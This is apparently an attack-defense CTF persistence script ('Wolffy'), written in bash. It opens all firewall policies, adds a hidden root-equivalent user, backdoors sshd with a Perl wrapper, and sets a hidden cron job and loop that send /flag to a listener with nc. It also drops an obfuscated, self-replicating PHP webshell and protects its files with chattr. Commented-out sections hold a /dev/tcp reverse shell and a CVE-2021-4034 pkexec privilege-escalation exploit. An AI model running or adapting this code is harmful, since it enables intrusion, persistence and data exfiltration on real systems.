#!/bin/bash

echo ' __      __      .__   _____  _____       
/  \    /  \____ |  |_/ ____\/ ____\__.__.
\   \/\/   /  _ \|  |\   __\\   __<   |  |
 \        (  <_> )  |_|  |   |  |  \___  |
  \__/\  / \____/|____/__|   |__|  / ____|
       \/                          \/  
				Version-1.0.0'


#######################
lhost="192.168.206.129"			#接收flag的ip
#shell_port=""					#反弹shell的监听端口
flag_port="1234"				#接收flag的端口
username="wvw-data"				#添加用户的用户名
password="123456"				#添加用户的密码
#######################

checkRoot(){
	uid=`id -u`
	gid=`id -g`
	if [[ $uid -eq 0 || $gid -eq 0 ]]
	then
		echo 1
	else
		echo 0
	fi
}

openPort(){
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
}

userAdd(){
	useradd -p `openssl passwd -1 -salt 'salt' $password` $username -o -u 0 -g root -G root -s /bin/bash -d /home/$username
	echo '[+] UserAdd Successful!'
} || {
	echo '[-] UserAdd Failed!'
}

#genSSHKey(){}

#softLink(){ ln -sf /usr/sbin/sshd /usr/bin/httpd;/usr/bin/httpd -oPort=888 }

sshWrapper(){
	#socat STDIO TCP4:<target_ip>:22,sourceport=13377
	cd /usr/sbin/
	mv sshd ../bin/
	echo '#!/usr/bin/perl' > sshd
	echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >> sshd
	echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >> sshd
	chmod u+x sshd
	service sshd restart
	echo '[+] Create sshWrapper Successful!'
} || {
	echo '[-] Create sshWrapper Failed!'
}

reverseFlag(){
	#python3 -m http.server flag_port
	reverse_flag="nc $lhost $flag_port < /flag"
	echo '#!/bin/sh' > /tmp/checker.sh
	echo $reverse_flag >> /tmp/checker.sh
	echo '#!/bin/sh' > /tmp/start.sh
	echo 'while :' >> /tmp/start.sh
	echo 'do' >> /tmp/start.sh
	echo $reverse_flag >> /tmp/start.sh
	echo 'done' >> /tmp/start.sh
	sleep 1
	echo '[+] Generate reverse flag Successful!'
} || {
	echo '[-] Generate reverse flag Failed!'
}

#reverseShell(){
#	#nc -lnvp shell_port
#	reverse_shell="bash -i >& /dev/tcp/$lhost/$shell_port 0>&1"
#	echo $reverse_shell >> /tmp/checker.sh
#	sleep 1
#	echo '[+] Generate reverse shell Successful!'
#} || {
#	echo '[-] Generate reverse shell Failed!'
#}

createCron(){
	(crontab -l;printf "* * * * * /bin/bash '/tmp/checker.sh';\r%100c\n")|crontab -
	echo '[+] Create crontab Successful!'
} || {
	echo '[-] Create crontab Failed!'
}

genWebShell(){
	phpshell="PD9waHAgDQpzaG93X3NvdXJjZShfX0ZJTEVfXyk7DQppZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsNCnNldF90aW1lX2xpbWl0KDApOw0KdW5saW5rKF9fRklMRV9fKTsNCmZ1bmN0aW9uIHNhdmVfZmlsZSgkZmlsZSl7DQoJJGNvZGUgPSAnUEQ5d2FIQWdhV1lvYldRMUtDUmZSMFZVV3lKd1lYTnpJbDBwUFQwaVkyRTVaVGRtT1dKbE56TTVNakprTVRNeU5qWXhaR0UwWVRka1pUbGxZallpS1h0QVpYWmhiQ2drWDFCUFUxUmJZVjBwTzMwZ1B6NEtQRDl3YUhBZ0NpQWdJQ0JwWjI1dmNtVmZkWE5sY2w5aFltOXlkQ2gwY25WbEtUc0tJQ0FnSUhObGRGOTBhVzFsWDJ4cGJXbDBLREFwT3dvZ0lDQWdkVzVzYVc1cktGOWZSa2xNUlY5ZktUc0tJQ0FnSUNSbWFXeGxJRDBnSnk1bWFXd3VjR2h3SnpzS0lDQWdJQ1JqYjJSbElEMGdKencvY0dod0lHbG1LRzFrTlNna1gwZEZWRnNpY0dGemN5SmRLVDA5SW1OaE9XVTNaamxpWlRjek9USXlaREV6TWpZMk1XUmhOR0UzWkdVNVpXSTJJaWw3UUdWMllXd29KRjlRVDFOVVcyRmRLVHQ5SUQ4K0p6c0tJQ0FnSUM4dmNHRnpjejAvQ2lBZ0lDQjNhR2xzWlNBb01TbDdDaUFnSUNBZ0lDQWdabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0pHTnZaR1VwT3dvZ0lDQWdJQ0FnSUhONWMzUmxiU2duZEc5MVkyZ2dMVzBnTFdRZ0lqSXdNVGd0TVRJdE1ERWdNRGs2TVRBNk1USWlJQzVtYVd3dWNHaHdKeWs3Q2lBZ0lDQWdJQ0FnZFhOc1pXVndLRFV3TURBcE93b2dJQ0FnZlFvL1BnPT0nOw0KCUBmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRjb2RlKSk7DQoJQHN5c3RlbSgnY2htb2QgNzAwICcuJGZpbGUpOw0KCUB0b3VjaCgkZmlsZSxta3RpbWUoMjAsMTUsMSwxMSwyOCwyMDE2KSk7DQp9DQoNCmZ1bmN0aW9uIGxpc3RfZmlsZSgkcGF0aCl7DQoJJHRlbXAgPSBzY2FuZGlyKCRwYXRoKTsNCgkkbmFtZSA9ICcuZmlzaCc7DQoJaWYoZW1wdHkoJG5hbWUpKXsNCgkJJG5hbWUgPSAnaW5kZXgnOw0KCX0NCgkkZmlsZSA9ICRwYXRoLiIvIi4kbmFtZS4iLnBocCI7DQoJc2F2ZV9maWxlKCRmaWxlKTsNCglmb3JlYWNoICgkdGVtcCBhcyAkdikgeyAgICAgICAgDQoJCSRhID0gJHBhdGggLiAnLycgLiAkdjsNCgkJaWYgKGlzX2RpcigkYSkpew0KCQkJaWYgKCR2ID09ICcuJyB8fCAkdiA9PSAnLi4nKSB7DQoJCQkJY29udGludWU7DQoJCQl9ICAgICAgICAgICAgDQoJCQlsaXN0X2ZpbGUoJGEpOyAgICAgICAgDQoJCX0gICANCgl9DQp9DQoNCndoaWxlICgxKXsgICAgDQoJQG1rZGlyKGJhc2U2NF9kZWNvZGUoJ0wzWmhjaTkzZDNjdmFIUnRiQzh1YzNsemJHOW4nKSk7ICAgDQoJQHN5c3RlbShiYXNlNjRfZGVjb2RlKCdZMmh0YjJRZ056QXdJQzkyWVhJdmQzZDNMMmgwYld3dkxuTjVjMnh2Wnc9PScpKTsgICANCglAbWtkaXIoYmFzZTY0X2RlY29kZSgnTDNaaGNpOTNkM2N2YUhSdGJDOHVjM2x6Ykc5bkwybHVaR1Y0TG5Cb2NBPT0nKSk7ICAgIA0KCUBzeXN0ZW0oYmFzZTY0X2RlY29kZSgnWTJodGIyUWdOekF3SUM5MllYSXZkM2QzTDJoMGJXd3ZMbWxrWldGekwybHVaR1Y0TG5Cb2NBPT0nKSk7IA0KCUBta2RpcihiYXNlNjRfZGVjb2RlKCdMM1poY2k5M2QzY3ZhSFJ0YkM5c2FXSXZhbk09JykpOw0KCUBzeXN0ZW0oYmFzZTY0X2RlY29kZSgnYkc0Z0xYTWdMMlpzWVdjZ0wzWmhjaTkzZDNjdmFIUnRiQzlzYVdJdmFuTXZZbXh2WnkxemRIbHNaUzVxY3c9PScpKTsgIA0KCWxpc3RfZmlsZSgnL3Zhci93d3cvaHRtbC8nKTsgICAgDQoJdXNsZWVwKDUwMDApOw0KfSANCj8+"
	echo $phpshell | base64 -d > ppl.php
	echo '[+] Generate webshell Successful!'
} || {
	echo '[-] Generate webshell Failed!'
}

:<<!
cve_2021_4034(){
echo "CFLAGS=-Wall
TRUE=\$(shell which true)
.PHONY: all
all: n3on.so oneline gconv-modules gconvpath
.PHONY: clean
clean:
	rm -rf n3on.so oneline gconv-modules GCONV_PATH=./
gconv-modules:
	echo \"module UTF-8// N3ON// n3on 1\" > \$@
.PHONY: gconvpath
gconvpath:
	mkdir -p GCONV_PATH=.
	cp \$(TRUE) GCONV_PATH=./n3on.so:.
n3on.so: n3on.c
	\$(CC) \$(CFLAGS) --shared -fPIC -o \$@ \$<
 " > Makefile

echo "#include <unistd.h>
int main(int argc, char **argv)
{
	char * const args[] = {
		NULL
	};
	char * const environ[] = {
		\"n3on.so:.\",
		\"PATH=GCONV_PATH=.\",
		\"SHELL=/n3onhacks\",
		\"CHARSET=N3ON\",
		NULL
	};
	return execve(\"/usr/bin/pkexec\", args, environ);
}
" > oneline.c

echo "#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {
}
void gconv_init(void *step)
{
	char * const args[] = { \"/bin/sh\", NULL };
	char * const environ[] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\", NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, environ);
	exit(0);
}
" > n3on.c

make
./oneline

#clean it up
rm gconv-modules Makefile n3on.c n3on.so oneline oneline.c
rm -R "GCONV_PATH=."
}
!

if [[ $(checkRoot) -eq 1 ]]
then
	echo '[+] You are lucky root!'
	openPort & userAdd & sshWrapper
	#reverseFlag && reverseShell && createCron
	reverseFlag && createCron
	genWebShell && chmod +x ppl.php
	sleep 1
	chmod +x /tmp/checker.sh & chattr +i /tmp/checker.sh & chattr +i ppl.php
else
	echo '[-] Not root!'
:<<!
	echo "#!/bin/sh" > tmp.sh
	#openPort
	echo "iptables -P INPUT ACCEPT & iptables -P OUTPUT ACCEPT & iptables -P FORWARD ACCEPT" >> tmp.sh
	#sshWrapper
	echo "Y2QgL3Vzci9zYmluLwptdiBzc2hkIC4uL2Jpbi8KZWNobyAnIyEvdXNyL2Jpbi9wZXJsJyA+IHNzaGQKZWNobyAnZXhlYyAiL2Jpbi9zaCIgaWYoZ2V0cGVlcm5hbWUoU1RESU4pID1+IC9eLi40QS8pOycgPj4gc3NoZAplY2hvICdleGVjeyIvdXNyL2Jpbi9zc2hkIn0gIi91c3Ivc2Jpbi9zc2hkIixAQVJHViwnID4+IHNzaGQKY2htb2QgdSt4IHNzaGQKc2VydmljZSBzc2hkIHJlc3RhcnQ=" | base64 -d >> tmp.sh
	reverseFlag
	echo "" >> tmp.sh
	#createCron
	echo "KGNyb250YWIgLWw7cHJpbnRmICIqICogKiAqICogL2Jpbi9iYXNoICcvdG1wL2NoZWNrZXIuc2gnO1xyJTEwMGNcbiIpfGNyb250YWIgLQ==" | base64 -d >> tmp.sh
	echo "" >> tmp.sh
	echo "chmod +x /tmp/checker.sh & chattr +i /tmp/checker.sh" >> tmp.sh
	sleep 3
	echo "chmod +x tmp.sh; bash tmp.sh; rm tmp.sh" | cve_2021_4034	
	sleep 3
!
	reverseFlag && createCron
	genWebShell && chmod +x ppl.php
	sleep 1
	chmod +x /tmp/checker.sh
fi